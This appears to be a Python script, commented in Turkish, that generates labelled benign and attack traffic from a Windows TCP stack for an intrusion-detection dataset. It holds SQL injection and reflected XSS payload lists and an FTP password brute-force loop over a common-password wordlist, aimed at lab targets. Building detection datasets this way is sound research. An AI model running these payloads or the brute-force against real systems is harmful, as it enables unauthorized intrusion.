# -*- coding: utf-8 -*-
"""
09_win_native_campaign.py
==========================
07_selfgen_campaign_full.sh'nin Windows-native esdegeri. WSL/Linux TCP
yigini yerine bu makinenin kendi Windows TCP yigini (Windows Python +
curl.exe -- Winsock) ile AYNI hedeflere (WSL kampanyasiyla ayni 4 port)
saldiri + benign trafik uretir.

Neden: R49-v2 (2026-08-20) selfgen verisinin K1/genelleme sorununu TEK bir
ozellige indirdi -- Init_Win_bytes_forward=64240, kampanyayi baslatan TUM
satirlarda sabitti (WSL'in TEK Linux kernel'i). Ampirik dogrulama (bu
oturum): Windows-native curl.exe -> ayni hedef, Init_Win=65535 (WSL'den
FARKLI). Bu script IKINCI, gercekten farkli bir TCP-yigini ekleyerek
Init_Win'in tek bir degerde >%60 yogunlasmasini engeller (R49-v2'nin
ongordugu kabul kriteri: en az birden fazla deger, hicbiri baskin degil).

hydra/medusa Windows'ta kurulu degil -- FTP-Patator icin ftplib tabanli,
kelime-listesi brute-force uygulayan portable bir esdeger kullanilir;
sqlmap yerine requests/curl.exe ile AYNI SQLi/XSS payload aileleri
gonderilir (R48'in "ayni saldiriyi curl+requests+sqlmap+tarayici ile
yakala" onerisiyle uyumlu -- farkli istemci = farkli parmak izi, ama
buradaki TEK gercek degisken TCP yigini/kernel).

Kullanim:
    python 09_win_native_campaign.py <target_ip> <n_cycles> <phases_json_out>
"""
import sys
import time
import random
import subprocess
import json
from ftplib import FTP, error_perm

import requests

CURL_EXE = "curl.exe"

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "\"><iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
]
SEARCH_TERMS = ["apple", "banana", "carrot", "juice", "fruit", "smoothie", "orange", "mango"]
WORDLIST = ["123456", "password", "admin", "root", "toor", "letmein", "qwerty", "test123", "P@ssw0rd", "esp32test"]

phases = []


def log_phase(tool, port, label, t0, t1):
    phases.append({"tool": tool, "dst_port": port, "label": label, "start": t0, "end": t1})


def run_phase(tool, port, label, fn):
    t0 = time.time()
    try:
        fn()
    except Exception as e:
        print("    [!] %s hata (yutuldu): %s" % (tool, e))
    t1 = time.time()
    log_phase(tool, port, label, t0, t1)
    print("  [win] %-24s port=%-5s label=%-12s dur=%.1fs" % (tool, port, label, t1 - t0))


def _get(url, params=None):
    try:
        requests.get(url, params=params, timeout=5)
    except requests.RequestException:
        pass
    full = url
    if params:
        import urllib.parse
        full = url + "?" + urllib.parse.urlencode(params)
    try:
        subprocess.run([CURL_EXE, "-s", full, "-o", "NUL"], timeout=5, capture_output=True)
    except Exception:
        pass


def benign_home(target_ip, port):
    for _ in range(4):
        _get("http://%s:%d/" % (target_ip, port))
        term = random.choice(SEARCH_TERMS)
        _get("http://%s:%d/rest/products/search" % (target_ip, port), params={"q": term})
        time.sleep(0.4)


def sqli_probe(target_ip, port):
    # sqlmap --technique=BE (boolean+error-based) dusuk-siddet probunun tipik
    # payload ailesi -- gercek sqlmap degil ama AYNI trafik SEKLINI (kisa GET
    # dizisi, tirnak/UNION/boolean varyantlari) uretir.
    payloads = [
        "1", "1'", "1' AND '1'='1", "1' AND '1'='2", "1 AND 1=1", "1 AND 1=2",
        "1' OR '1'='1'--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1'-- -", "1\" AND \"1\"=\"1",
    ]
    for p in payloads:
        _get("http://%s:%d/vulnerabilities/sqli/" % (target_ip, port), params={"id": p})
        time.sleep(0.1)


def xss_probe(target_ip, port, payload):
    for _ in range(3):
        _get("http://%s:%d/vulnerabilities/xss_r/" % (target_ip, port), params={"name": payload})
        time.sleep(0.3)


def ftp_benign(target_ip, port):
    for _ in range(2):
        try:
            ftp = FTP()
            ftp.connect(target_ip, port, timeout=3)
            ftp.login("testuser", "esp32test")
            ftp.quit()
        except Exception:
            pass
        time.sleep(0.4)


def ftp_bruteforce(target_ip, port, stop_on_success):
    # hydra(-f: ilk basaridan sonra dur) / medusa (tam tarama) esdegeri.
    for pw in WORDLIST:
        try:
            ftp = FTP()
            ftp.connect(target_ip, port, timeout=3)
            ftp.login("testuser", pw)
            ftp.quit()
            if stop_on_success:
                break
        except error_perm:
            pass
        except Exception:
            pass


def main():
    if len(sys.argv) < 4:
        print("Kullanim: python 09_win_native_campaign.py <target_ip> <n_cycles> <phases_json_out>")
        sys.exit(1)
    target_ip = sys.argv[1]
    n_cycles = int(sys.argv[2])
    phases_out = sys.argv[3]

    for cycle in range(1, n_cycles + 1):
        print("=== WIN CYCLE %d / %d ===" % (cycle, n_cycles))
        if cycle % 2 == 0:
            web_port, ftp_port = 80, 21
        else:
            web_port, ftp_port = 3000, 2121

        run_phase("win_benign_home_%d" % cycle, web_port, "BENIGN",
                   lambda wp=web_port: benign_home(target_ip, wp))
        time.sleep(0.5)

        run_phase("win_sqli_%d" % cycle, web_port, "WebAttack",
                   lambda wp=web_port: sqli_probe(target_ip, wp))
        time.sleep(0.5)

        payload = XSS_PAYLOADS[cycle % len(XSS_PAYLOADS)]
        run_phase("win_xss_%d" % cycle, web_port, "WebAttack",
                   lambda wp=web_port, pl=payload: xss_probe(target_ip, wp, pl))
        time.sleep(0.5)

        run_phase("win_benign_ftp_%d" % cycle, ftp_port, "BENIGN",
                   lambda fp=ftp_port: ftp_benign(target_ip, fp))
        time.sleep(0.5)

        stop_on_success = (cycle % 2 == 0)
        tool = "win_hydra_like" if stop_on_success else "win_medusa_like"
        run_phase("%s_%d" % (tool, cycle), ftp_port, "FTP-Patator",
                   lambda fp=ftp_port, s=stop_on_success: ftp_bruteforce(target_ip, fp, s))
        time.sleep(1)

    with open(phases_out, "w", encoding="utf-8") as f:
        json.dump(phases, f)
    print("=== TUM WIN DONGULER TAMAMLANDI (%d cycle), %d faz yazildi ===" % (n_cycles, len(phases)))


if __name__ == "__main__":
    main()
